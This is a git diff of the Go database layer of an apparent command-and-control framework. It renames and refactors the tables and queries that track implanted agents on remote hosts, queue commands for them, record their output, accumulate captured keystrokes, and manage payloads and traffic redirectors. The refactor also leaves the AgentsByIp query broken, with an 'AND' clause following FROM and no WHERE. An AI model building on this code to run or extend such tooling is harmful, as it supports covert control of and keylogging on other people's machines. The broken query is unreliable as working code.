@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"time"
 
 	"github.com/PatronC2/Patron/helper"
 	"github.com/PatronC2/Patron/types"	
@@ -15,8 +14,8 @@ import (
 
 var db *sql.DB
 
-func OpenDatabase(){ 
-	var err error
+func OpenDatabase() {
+    var err error
 
     host := os.Getenv("DB_HOST")
     port := os.Getenv("DB_PORT")
@@ -24,53 +23,65 @@ func OpenDatabase(){
     password := os.Getenv("DB_PASS")
     dbname := os.Getenv("DB_NAME")
 
-	logger.Logf(logger.Info, "Connecting to database %s\n", host)
+    psqlInfo := fmt.Sprintf("host=%s port=%s user=%s "+
+        "password=%s dbname=%s sslmode=disable",
+        host, port, user, password, dbname)
 
-	psqlInfo := fmt.Sprintf("host=%s port=%s user=%s "+
-    "password=%s dbname=%s sslmode=disable",
-    host, port, user, password, dbname)
-	for {
+    db, err = sql.Open("postgres", psqlInfo)
+    if err != nil {
+        logger.Logf(logger.Error, "Failed to open database connection: %v\n", err)
+        return
+    }
 
-		db, err = sql.Open("postgres", psqlInfo)
-		if err != nil {
-			logger.Logf(logger.Error, "Failed to connect to the database: %v\n", err)
-			time.Sleep(30 * time.Second)
-			continue
-		}
-		err = db.Ping()
-		if err != nil {
-			logger.Logf(logger.Error, "Failed to ping the database: %v\n", err)
-			db.Close()
-			time.Sleep(30 * time.Second)
-			continue
-		}
-		logger.Logf(logger.Info, "Postgres DB connected\n")
-		break
-	}
+    err = db.Ping()
+    if err != nil {
+        logger.Logf(logger.Error, "Failed to ping database: %v\n", err)
+        db.Close()
+        return
+    }
+
+    logger.Logf(logger.Info, "Connected to the database successfully.")
 }
 
 func InitDatabase() {
 
 	AgentSQL := `
-	CREATE TABLE IF NOT EXISTS "Agents" (
+	CREATE TABLE IF NOT EXISTS "agents" (
 		"AgentID" SERIAL PRIMARY KEY,
 		"UUID" TEXT NOT NULL UNIQUE,
-		"Status" TEXT NOT NULL DEFAULT 'Online',
-		"CallBackToIP" TEXT NOT NULL DEFAULT 'Unknown',
-		"CallBackFeq" TEXT NOT NULL DEFAULT 'Unknown',
+		"ServerIP" TEXT NOT NULL DEFAULT 'Unknown',
+		"ServerPort" TEXT NOT NULL DEFAULT 'Unknown',
+		"CallBackFreq" TEXT NOT NULL DEFAULT 'Unknown',
 		"CallBackJitter" TEXT NOT NULL DEFAULT 'Unknown',
 		"Ip" TEXT NOT NULL DEFAULT 'Unknown',
 		"User" TEXT NOT NULL DEFAULT 'Unknown',
 		"Hostname" TEXT NOT NULL DEFAULT 'Unknown',
-		"isDeleted" INTEGER NOT NULL DEFAULT 0,
-		"LastCallBack" INTEGER NOT NULL DEFAULT 0
+		"LastCallBack" TIMESTAMP
 	);
+	CREATE OR REPLACE VIEW agents_status AS
+	SELECT 
+		"AgentID",
+		"UUID",
+		"ServerIP",
+		"ServerPort",
+		"CallBackFreq",
+		"CallBackJitter",
+		"Ip",
+		"User",
+		"Hostname",
+		"LastCallBack",
+		CASE 
+			WHEN "LastCallBack" IS NULL OR "LastCallBack" < NOW() - INTERVAL '1 second' * 2 * CAST("CallBackFreq" AS INTEGER) THEN 'Offline'
+			ELSE 'Online'
+		END AS "Status"
+	FROM 
+		"agents";
 	`
 	_, err := db.Exec(AgentSQL)
 	if err != nil {
 		log.Fatal(err.Error())
 	}
-	logger.Logf(logger.Info, "Agents table initialized\n")
+	logger.Logf(logger.Info, "agents table initialized\n")
 
 	CommandSQL := `
 	CREATE TABLE IF NOT EXISTS "Commands" (
@@ -81,7 +92,7 @@ func InitDatabase() {
 		"Command" TEXT,
 		"CommandUUID" TEXT,
 		"Output" TEXT DEFAULT 'Pending',
-		FOREIGN KEY ("UUID") REFERENCES "Agents" ("UUID")
+		FOREIGN KEY ("UUID") REFERENCES "agents" ("UUID")
 	);
 	`
 	_, err = db.Exec(CommandSQL)
@@ -95,7 +106,7 @@ func InitDatabase() {
 		"KeylogID" SERIAL PRIMARY KEY,
 		"UUID" TEXT,
 		"Keys" TEXT,
-		FOREIGN KEY ("UUID") REFERENCES "Agents" ("UUID")
+		FOREIGN KEY ("UUID") REFERENCES "agents" ("UUID")
 	);
 	`
 	_, err = db.Exec(KeylogSQL)
@@ -143,7 +154,7 @@ func InitDatabase() {
 		"NoteID" SERIAL PRIMARY KEY,
 		"UUID" TEXT NOT NULL,
 		"Note" TEXT,
-		FOREIGN KEY ("UUID") REFERENCES "Agents" ("UUID"),
+		FOREIGN KEY ("UUID") REFERENCES "agents" ("UUID"),
 		UNIQUE ("UUID")
 	);
 	`
@@ -159,7 +170,7 @@ func InitDatabase() {
 		"UUID" TEXT NOT NULL,
 		"Key" TEXT NOT NULL,
 		"Value" TEXT,
-		FOREIGN KEY ("UUID") REFERENCES "Agents" ("UUID"),
+		FOREIGN KEY ("UUID") REFERENCES "agents" ("UUID"),
 		UNIQUE ("UUID", "Key")
 	);
 	`
@@ -205,45 +216,39 @@ func InitDatabase() {
 
 }
 
-func CreateAgent(uuid string, CallBackToIP string, CallBackFeq string, CallBackJitter string, Ip string, User string, Hostname string) {
-	CreateAgentSQL := `INSERT INTO "Agents" ("UUID", "CallBackToIP", "CallBackFeq", "CallBackJitter", "Ip", "User", "Hostname")
-VALUES ($1, $2, $3, $4, $5, $6, $7)`
+func CreateAgent(uuid, ServerIP, ServerPort, CallBackFreq, CallBackJitter, Ip, User, Hostname string) error {
+    CreateAgentSQL := `
+        INSERT INTO "agents" ("UUID", "ServerIP", "ServerPort", "CallBackFreq", "CallBackJitter", "Ip", "User", "Hostname")
+        VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`
 
-	statement, err := db.Prepare(CreateAgentSQL)
-	if err != nil {
+    _, err := db.Exec(CreateAgentSQL, uuid, ServerIP, ServerPort, CallBackFreq, CallBackJitter, Ip, User, Hostname)
+    if err != nil {
+        logger.Logf(logger.Error, "Error creating agent in DB: %v", err)
+        return err
+    }
 
-		log.Fatalln(err)
-		logger.Logf(logger.Info, "Error in DB\n")
-	}
-
-	_, err = statement.Exec(uuid, CallBackToIP, CallBackFeq, CallBackJitter, Ip, User, Hostname)
-	if err != nil {
-
-		log.Fatalln(err)
-	}
-	logger.Logf(logger.Info, "New Agent created in DB\n")
+    logger.Logf(logger.Info, "New agent created in DB: %s", uuid)
+    return nil
 }
 
-func CreateKeys(uuid string) {
-	CreateKeysSQL := `INSERT INTO "Keylog" ("UUID", "Keys")
-	VALUES ($1, $2)`
 
-	statement, err := db.Prepare(CreateKeysSQL)
-	if err != nil {
+func CreateKeys(uuid string) error {
+    CreateKeysSQL := `
+        INSERT INTO "Keylog" ("UUID", "Keys")
+        VALUES ($1, $2)`
 
-		log.Fatalln(err)
-		logger.Logf(logger.Info, "Error in DB\n")
-	}
+    _, err := db.Exec(CreateKeysSQL, uuid, "")
+    if err != nil {
+        logger.Logf(logger.Error, "Error creating keylog entry in DB for UUID %s: %v", uuid, err)
+        return err
+    }
 
-	_, err = statement.Exec(uuid, "")
-	if err != nil {
-
-		log.Fatalln(err)
-	}
-	logger.Logf(logger.Info, "New Keylog Agent created in DB\n")
+    logger.Logf(logger.Info, "New keylog entry created for agent %s", uuid)
+    return nil
 }
 
-func CreatePayload(uuid string, name string, description string, ServerIP string, ServerPort string, CallBackFeq string, CallBackJitter string, Concat string) {
+
+func CreatePayload(uuid string, name string, description string, ServerIP string, ServerPort string, CallBackFreq string, CallBackJitter string, Concat string) {
 	CreateAgentSQL := `INSERT INTO "Payloads" ("UUID", "Name", "Description", "ServerIP", "ServerPort", "CallbackFrequency", "CallbackJitter", "Concat")
 	VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`
 
@@ -254,7 +259,7 @@ func CreatePayload(uuid string, name string, description string, ServerIP string
 		logger.Logf(logger.Info, "Error in DB\n")
 	}
 
-	_, err = statement.Exec(uuid, name, description, ServerIP, ServerPort, CallBackFeq, CallBackJitter, Concat)
+	_, err = statement.Exec(uuid, name, description, ServerIP, ServerPort, CallBackFreq, CallBackJitter, Concat)
 	if err != nil {
 
 		log.Fatalln(err)
@@ -262,95 +267,80 @@ func CreatePayload(uuid string, name string, description string, ServerIP string
 	logger.Logf(logger.Info, "New Payload created in DB\n")
 }
 
-func FetchOneAgent(uuid string) (info types.ConfigAgent, err error ) {
-	FetchSQL := `
-	SELECT 
-		"UUID",
-		"CallBackToIP",
-		"CallBackFeq",
-		"CallBackJitter",
-		"Status",
-		"Ip",
-		"User",
-		"Hostname"
-	FROM "Agents" WHERE "UUID"=$1
-	`
-	row, err := db.Query(FetchSQL, uuid)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer row.Close()
-	for row.Next() {
-		err := row.Scan(
-			&info.Uuid,
-			&info.CallbackTo,
-			&info.CallbackFrequency,
-			&info.CallbackJitter,
-			&info.Status,
-			&info.AgentIP,
-			&info.Username,
-			&info.Hostname,
-		)
-		switch err {
-		case sql.ErrNoRows:
-			logger.Logf(logger.Info, "No rows were returned!! \n")
-			return info, err
-		case nil:
-			logger.Logf(logger.Info, "%v\n", info)
-		default:
-			panic(err)
-		}
-	}
+func FetchOneAgent(uuid string) (info types.ConfigurationRequest, err error) {
+    query := `
+        SELECT 
+            "UUID",
+            "ServerIP",
+            "ServerPort",
+            "CallBackFreq",
+            "CallBackJitter",
+            "Ip",
+            "User",
+            "Hostname",
+            "Status"
+        FROM "agents_status" WHERE "UUID"=$1
+    `
 
-	logger.Logf(logger.Info, "Agent %s Fetched \n", info.Uuid)
-	return info, err
+    err = db.QueryRow(query, uuid).Scan(
+        &info.AgentID,
+        &info.ServerIP,
+        &info.ServerPort,
+        &info.CallbackFrequency,
+        &info.CallbackJitter,
+        &info.AgentIP,
+        &info.Username,
+        &info.Hostname,
+        &info.Status,
+    )
+
+    if err == sql.ErrNoRows {
+        logger.Logf(logger.Info, "No agent found with UUID: %s", uuid)
+        return info, nil
+    } else if err != nil {
+        logger.Logf(logger.Error, "Error fetching agent with UUID: %s - %v", uuid, err)
+        return info, err
+    }
+
+    logger.Logf(logger.Info, "Fetched agent: %v", info)
+    return info, nil
 }
 
-func FetchNextCommand(uuid string) types.GiveAgentCommand {
-	var info types.GiveAgentCommand
-	FetchSQL := `
-	SELECT 
-		"Commands"."UUID", 
-		"Agents"."CallBackToIP", 
-		"Agents"."CallBackFeq", 
-		"Agents"."CallBackJitter", 
-		"Commands"."CommandType", 
-		"Commands"."Command", 
-		"Commands"."CommandUUID"
-	FROM "Commands" INNER JOIN 
-		"Agents" ON "Commands"."UUID" = "Agents"."UUID" 
-	WHERE "Commands"."UUID"=$1 AND "Commands"."Result"='0' LIMIT 1
-	`
-	row, err := db.Query(FetchSQL, uuid)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer row.Close()
-	for row.Next() {
-		err := row.Scan(
-			&info.UpdateAgentConfig.Uuid,
-			&info.UpdateAgentConfig.CallbackTo,
-			&info.UpdateAgentConfig.CallbackFrequency,
-			&info.UpdateAgentConfig.CallbackJitter,
-			&info.CommandType,
-			&info.Command,
-			&info.CommandUUID,
-			// &info.Binary,
-		)
-		switch err {
-		case sql.ErrNoRows:
-			logger.Logf(logger.Info, "No rows were returned!! \n")
-			return info
-		case nil:
-			logger.Logf(logger.Info, "%v\n", info)
-		default:
-			panic(err)
-		}
-	}
 
-	logger.Logf(logger.Info, "Agent %s Fetched Next Command %s \n", info.UpdateAgentConfig.Uuid, info.Command)
-	return info
+func FetchNextCommand(uuid string) types.CommandResponse {
+    var info types.CommandResponse
+    query := `
+        SELECT 
+            "Commands"."UUID", 
+            "Commands"."CommandType", 
+            "Commands"."Command", 
+            "Commands"."CommandUUID"
+        FROM "Commands" 
+        INNER JOIN "agents" ON "Commands"."UUID" = "agents"."UUID" 
+        WHERE "Commands"."UUID" = $1 
+        AND "Commands"."Result" = '0' 
+        LIMIT 1;
+    `
+
+    row := db.QueryRow(query, uuid)
+    err := row.Scan(
+        &info.AgentID,
+        &info.CommandType,
+        &info.Command,
+        &info.CommandID,
+    )
+    if err == sql.ErrNoRows {
+        logger.Logf(logger.Info, "No commands available for agent: %s\n", uuid)
+        return info
+    } else if err != nil {
+        logger.Logf(logger.Error, "Error fetching command for agent: %v\n", err)
+        return info
+    }
+
+    logger.Logf(logger.Info, "Fetched command %s for agent %s\n", info.Command, uuid)
+    return info
 }
+
 func SendAgentCommand(uuid string, result string, CommandType string, Command string, CommandUUID string) {
 	SendAgentCommandSQL := `INSERT INTO "Commands" ("UUID", "Result", "CommandType", "Command", "CommandUUID")
 	VALUES ($1, $2, $3, $4, $5)`
@@ -370,8 +360,8 @@ func SendAgentCommand(uuid string, result string, CommandType string, Command st
 	logger.Logf(logger.Info, "Agent %s Reveived New Command \n", uuid)
 }
 
-func UpdateAgentConfig(UUID string, CallbackServer string, CallbackFrequency string, CallbackJitter string) {
-	updateAgentConfigSQL := `UPDATE "Agents" SET "CallBackToIP"= $1, "CallBackFeq"= $2, "CallBackJitter"= $3 WHERE "UUID"= $4`
+func UpdateAgentConfig(UUID string, ServerIP string, ServerPort string, CallbackFrequency string, CallbackJitter string) {
+	updateAgentConfigSQL := `UPDATE "agents" SET "ServerIP"= $1, "ServerPort"= $2, "CallBackFreq"= $3, "CallBackJitter"= $4 WHERE "UUID"= $5`
 
 	statement, err := db.Prepare(updateAgentConfigSQL)
 	if err != nil {
@@ -380,7 +370,7 @@ func UpdateAgentConfig(UUID string, CallbackServer string, CallbackFrequency str
 		logger.Logf(logger.Info, "Error in DB\n")
 	}
 
-	_, err = statement.Exec(CallbackServer, CallbackFrequency, CallbackJitter, UUID)
+	_, err = statement.Exec(ServerIP, ServerPort, CallbackFrequency, CallbackJitter, UUID)
 	if err != nil {
 
 		log.Fatalln(err)
@@ -388,113 +378,70 @@ func UpdateAgentConfig(UUID string, CallbackServer string, CallbackFrequency str
 	logger.Logf(logger.Info, "Agent %s Reveived Config Update  \n", UUID)
 }
 
-func UpdateAgentCheckIn(UUID string, LastCallBack int64) {
-	updateAgentCheckInSQL := `UPDATE "Agents" SET "LastCallBack"= $1 WHERE "UUID"= $2`
+func UpdateAgentCheckIn(uuid string) error {
+    UpdateSQL := `
+        UPDATE "agents"
+        SET "LastCallBack" = NOW()
+        WHERE "UUID" = $1`
 
-	statement, err := db.Prepare(updateAgentCheckInSQL)
-	if err != nil {
+    _, err := db.Exec(UpdateSQL, uuid)
+    if err != nil {
+        logger.Logf(logger.Error, "Error updating agent check-in for UUID %s: %v", uuid, err)
+        return err
+    }
 
-		log.Fatalln(err)
-		logger.Logf(logger.Info, "Error in DB\n")
-	}
-
-	_, err = statement.Exec(LastCallBack, UUID)
-	if err != nil {
-
-		log.Fatalln(err)
-	}
-	logger.Logf(logger.Done, "Agent %s Check in Update  \n", UUID)
+    logger.Logf(logger.Info, "Agent %s check-in updated in DB", uuid)
+    return nil
 }
 
-func UpdateAgentStatus() {
-	updateAgentStatusSQL := `UPDATE "Agents"
-	SET "Status" = CASE WHEN (EXTRACT(EPOCH FROM CURRENT_TIMESTAMP)  - "LastCallBack" > (2 * ("CallBackFeq"::numeric)))
-		THEN 'Offline' ELSE 'Online' END
-	WHERE "AgentID" IN (SELECT "AgentID" FROM "Agents");`
+func UpdateAgentCommand(CommandUUID, Result, Output, uuid string) error {
+    updateAgentCommandSQL := `
+        UPDATE "Commands"
+        SET "Result" = $1, "Output" = $2
+        WHERE "CommandUUID" = $3`
 
-	statement, err := db.Prepare(updateAgentStatusSQL)
-	if err != nil {
+    _, err := db.Exec(updateAgentCommandSQL, Result, Output, CommandUUID)
+    if err != nil {
+        logger.Logf(logger.Error, "Error updating command for CommandUUID %s: %v", CommandUUID, err)
+        return err
+    }
 
-		log.Fatalln(err)
-		logger.Logf(logger.Info, "Error in DB\n")
-	}
-
-	_, err = statement.Exec()
-	if err != nil {
-
-		log.Fatalln(err)
-	}
-	logger.Logf(logger.Info, "Agent Status Updated\n")
+    logger.Logf(logger.Info, "Command %s updated for agent %s", CommandUUID, uuid)
+    return nil
 }
 
-func UpdateAgentCommand(CommandUUID string, Output string, uuid string) {
-	updateAgentCommandSQL := `UPDATE "Commands" SET "Result"='1', "Output"= $1 WHERE "CommandUUID"= $2`
+func UpdateAgentKeys(UUID, Keys string) error {
+    updateAgentKeylogSQL := `
+        UPDATE "Keylog"
+        SET "Keys" = "Keys" || $1
+        WHERE "UUID" = $2
+    `
+    _, err := db.Exec(updateAgentKeylogSQL, Keys, UUID)
+    if err != nil {
+        logger.Logf(logger.Error, "Error updating keys for agent with UUID %s: %v", UUID, err)
+        return err
+    }
 
-	statement, err := db.Prepare(updateAgentCommandSQL)
-	if err != nil {
-
-		log.Fatalln(err)
-		logger.Logf(logger.Info, "Error in DB\n")
-	}
-
-	_, err = statement.Exec(Output, CommandUUID)
-	if err != nil {
-
-		log.Fatalln(err)
-	}
-	logger.Logf(logger.Info, "Agent %s Reveived Output with CommandID %s \n", uuid, CommandUUID)
-}
-
-func UpdateAgentKeys(UUID string, Keys string) {
-	updateAgentKeylogSQL := `UPDATE "Keylog" SET "Keys"="Keys" || $1 WHERE "UUID"= $2`
-
-	statement, err := db.Prepare(updateAgentKeylogSQL)
-	if err != nil {
-
-		log.Fatalln(err)
-		logger.Logf(logger.Info, "Error in DB\n")
-	}
-
-	_, err = statement.Exec(Keys, UUID)
-	if err != nil {
-
-		log.Fatalln(err)
-	}
-}
-
-func DeleteAgent(UUID string) {
-	DeleteAgentSQL := `UPDATE "Agents" SET "isDeleted"=1 WHERE "UUID"= $1`
-
-	statement, err := db.Prepare(DeleteAgentSQL)
-	if err != nil {
-
-		log.Fatalln(err)
-		logger.Logf(logger.Info, "Error in DB\n")
-	}
-
-	_, err = statement.Exec(UUID)
-	if err != nil {
-
-		log.Fatalln(err)
-	}
+    logger.Logf(logger.Info, "Successfully updated keys for agent with UUID %s", UUID)
+    return nil
 }
 
 // WEB Functions
 
-func Agents() (agentAppend []types.ConfigAgent, err error) {
-	var agents types.ConfigAgent
+func Agents() (agentAppend []types.ConfigurationRequest, err error) {
+	var agents types.ConfigurationRequest
 	FetchSQL := `
 	SELECT 
-		"UUID", 
-		"CallBackToIP", 
-		"CallBackFeq", 
-		"CallBackJitter", 
+		"UUID",
+		"ServerIP", 
+		"ServerPort", 
+		"CallBackFreq",
+		"CallBackJitter",
 		"Ip", 
 		"User", 
 		"Hostname",
 		"Status"
-	FROM "Agents"
-	WHERE "isDeleted"='0'
+	FROM "agents_status"
 	`
 	row, err := db.Query(FetchSQL)
 	if err != nil {
@@ -503,8 +450,9 @@ func Agents() (agentAppend []types.ConfigAgent, err error) {
 	defer row.Close()
 	for row.Next() {
 		row.Scan(
-			&agents.Uuid,
-			&agents.CallbackTo,
+			&agents.AgentID,
+			&agents.ServerIP,
+			&agents.ServerPort,
 			&agents.CallbackFrequency,
 			&agents.CallbackJitter,
 			&agents.AgentIP,
@@ -514,23 +462,24 @@ func Agents() (agentAppend []types.ConfigAgent, err error) {
 		)
 		agentAppend = append(agentAppend, agents)
 	}
+	logger.Logf(logger.Info, "Agents: %v", agentAppend)
 	return agentAppend, err
 }
 
-func AgentsByIp(Ip string) (agentAppend []types.ConfigAgent, err error) {
-	var agents types.ConfigAgent
+func AgentsByIp(Ip string) (agentAppend []types.ConfigurationRequest, err error) {
+	var agents types.ConfigurationRequest
 	FetchSQL := `
 	SELECT 
 		"UUID", 
-		"CallBackToIP", 
-		"CallBackFeq", 
+		"ServerIP",
+		"ServerPort",
+		"CallBackFreq", 
 		"CallBackJitter", 
 		"Ip", 
 		"User", 
 		"Hostname",
 		"Status"
-	FROM "Agents"
-	WHERE "isDeleted"='0'
+	FROM "agents_status"
 	AND "Ip" = $1
 	`
 	row, err := db.Query(FetchSQL, Ip)
@@ -540,33 +489,15 @@ func AgentsByIp(Ip string) (agentAppend []types.ConfigAgent, err error) {
 	defer row.Close()
 	for row.Next() {
 		row.Scan(
-			&agents.Uuid,
-			&agents.CallbackTo,
+			&agents.AgentID,
+			&agents.ServerIP,
+			&agents.ServerPort,
 			&agents.CallbackFrequency,
 			&agents.CallbackJitter,
 			&agents.AgentIP,
 			&agents.Username,
 			&agents.Hostname,
 			&agents.Status,
-		)
-		agentAppend = append(agentAppend, agents)
-	}
-	return agentAppend, err
-}
-
-func GroupAgentsByIp() (agentAppend []types.AgentIP, err error){
-	var agents types.AgentIP
-	FetchSQL := `
-	SELECT DISTINCT "Ip" FROM "Agents"
-	`
-	row, err := db.Query(FetchSQL)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer row.Close()
-	for row.Next() {
-		row.Scan(
-			&agents.AgentIP,
 		)
 		agentAppend = append(agentAppend, agents)
 	}
@@ -610,8 +541,8 @@ func Payloads() []types.Payload {
 	return payloadAppend
 }
 
-func GetAgentCommands(uuid string) (infoAppend []types.Agent, err error) {
-	var info types.Agent
+func GetAgentCommands(uuid string) (infoAppend []types.AgentCommands, err error) {
+	var info types.AgentCommands
 	FetchSQL := `
 	SELECT 
 		"UUID", 
@@ -642,11 +573,11 @@ func GetAgentCommands(uuid string) (infoAppend []types.Agent, err error) {
 	return infoAppend, err
 }
 
-func Keylog(uuid string) []types.KeyReceive {
-	var info types.KeyReceive
+func Keylog(uuid string) []types.KeysRequest {
+	var info types.KeysRequest
 	FetchSQL := `
 	SELECT 
-		"UUID", 
+		"UUID",
 		"Keys"
 	FROM "Keylog"
 	WHERE "UUID"= $1
@@ -657,10 +588,10 @@ func Keylog(uuid string) []types.KeyReceive {
 		log.Fatal(err)
 	}
 	defer row.Close()
-	var infoAppend []types.KeyReceive
+	var infoAppend []types.KeysRequest
 	for row.Next() {
 		row.Scan(
-			&info.Uuid,
+			&info.AgentID,
 			&info.Keys,
 		)
 		info.Keys = helper.FormatKeyLogs(info.Keys)
@@ -669,12 +600,12 @@ func Keylog(uuid string) []types.KeyReceive {
 	return infoAppend
 }
 
-func FetchOne(uuid string) (infoAppend []types.ConfigAgent, err error) {
-	var info types.ConfigAgent
+func FetchOne(uuid string) (infoAppend []types.ConfigurationResponse, err error) {
+	var info types.ConfigurationResponse
 	FetchSQL := `
 	SELECT 
-		"UUID","CallBackToIP","CallBackFeq","CallBackJitter"
-	FROM "Agents" WHERE "UUID"=$1
+		"UUID","ServerIP", "ServerPort","CallBackFreq","CallBackJitter"
+	FROM "agents" WHERE "UUID"=$1
 	`
 	row, err := db.Query(FetchSQL, uuid)
 	if err != nil {
@@ -683,8 +614,9 @@ func FetchOne(uuid string) (infoAppend []types.ConfigAgent, err error) {
 	defer row.Close()
 	for row.Next() {
 		row.Scan(
-			&info.Uuid,
-			&info.CallbackTo,
+			&info.AgentID,
+			&info.ServerIP,
+			&info.ServerPort,
 			&info.CallbackFrequency,
 			&info.CallbackJitter,
 		)
@@ -851,31 +783,35 @@ func GetRedirectors() (redirectors []types.Redirector, err error) {
 	return redirectors, nil
 }
 
-func CreateRedirector(RedirectorID string, Name string, Description string, ForwardIP string, ForwardPort string, ListenIP string, ListenPort string) (err error) {
-	FetchSQL := `
-    INSERT INTO redirectors ("RedirectorID", "Name", "Description", "ForwardIP", "ForwardPort", "ListenIP", "ListenPort")
-    VALUES ($1, $2, $3, $4, $5, $6, $7)
-	`
-	_, err = db.Query(FetchSQL, RedirectorID, Name, Description, ForwardIP, ForwardPort, ListenIP, ListenPort)
+func CreateRedirector(RedirectorID, Name, Description, ForwardIP, ForwardPort, ListenIP, ListenPort string) error {
+    InsertSQL := `
+        INSERT INTO "redirectors" ("RedirectorID", "Name", "Description", "ForwardIP", "ForwardPort", "ListenIP", "ListenPort")
+        VALUES ($1, $2, $3, $4, $5, $6, $7)
+    `
+
+    _, err := db.Exec(InsertSQL, RedirectorID, Name, Description, ForwardIP, ForwardPort, ListenIP, ListenPort)
     if err != nil {
-        log.Fatalln(err)
+        logger.Logf(logger.Error, "Error creating redirector with RedirectorID %s: %v", RedirectorID, err)
         return err
     }
-    logger.Logf(logger.Info, "Successfully submitted redirector to db\n")
+
+    logger.Logf(logger.Info, "Successfully created redirector with RedirectorID %s", RedirectorID)
     return nil
 }
 
-func SetRedirectorStatus(RedirectorID string) (err error) {
-	UpdateSQL := `
-	UPDATE "redirectors"
-	SET "LastReport" = NOW()
-	WHERE "RedirectorID" = $1;
-	`
-	_, err = db.Query(UpdateSQL, RedirectorID)
+func SetRedirectorStatus(RedirectorID string) error {
+    UpdateSQL := `
+        UPDATE "redirectors"
+        SET "LastReport" = NOW()
+        WHERE "RedirectorID" = $1;
+    `
+
+    _, err := db.Exec(UpdateSQL, RedirectorID)
     if err != nil {
-        log.Fatalln(err)
+        logger.Logf(logger.Error, "Error updating redirector status for RedirectorID %s: %v", RedirectorID, err)
         return err
     }
-    logger.Logf(logger.Info, "Updated redirector status in the db\n")
+
+    logger.Logf(logger.Info, "Updated redirector status for RedirectorID %s", RedirectorID)
     return nil
 }
